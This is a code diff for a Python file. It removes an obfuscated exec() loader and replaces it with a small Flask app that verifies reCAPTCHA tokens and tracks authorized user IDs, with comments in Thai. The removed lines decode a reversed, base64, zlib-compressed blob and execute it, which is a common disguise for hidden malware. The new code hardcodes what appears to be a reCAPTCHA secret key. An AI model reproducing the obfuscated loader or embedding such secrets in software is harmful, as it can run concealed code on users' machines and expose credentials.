@@ -1,2 +1,37 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'==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'))
+from flask import Flask, request, jsonify
+from flask_cors import CORS
+import requests
+
+app = Flask(__name__)
+CORS(app)
+
+SECRET_KEY = "6LcavvArAAAAAAOWDD_1TaBUwCfnNH3sDSR1L5cV"
+# เก็บ ID ที่ผ่าน Captcha แล้วไว้ที่นี่
+authorized_users = {}
+
+@app.route('/api/activate', methods=['POST'])
+def activate():
+    data = request.json
+    uid = str(data.get('userid'))
+    token = data.get('token')
+    
+    verify = requests.post("https://www.google.com/recaptcha/api/siteverify", data={
+        'secret': SECRET_KEY, 'response': token
+    }).json()
+
+    if verify.get('success'):
+        # ลงทะเบียน ID นี้ให้ใช้งานได้ 1 ชั่วโมง (หรือจนกว่า Server จะรีสตาร์ท)
+        authorized_users[uid] = True
+        return jsonify({"status": "activated"})
+    return jsonify({"error": "Captcha Fail"}), 400
+
+@app.route('/api/check/<uid>')
+def check(uid):
+    if str(uid) in authorized_users:
+        return jsonify({"access": True})
+    return jsonify({"access": False}), 401
+
+if __name__ == "__main__":
+    import os
+    port = int(os.environ.get("PORT", 10000))
+    app.run(host='0.0.0.0', port=port)
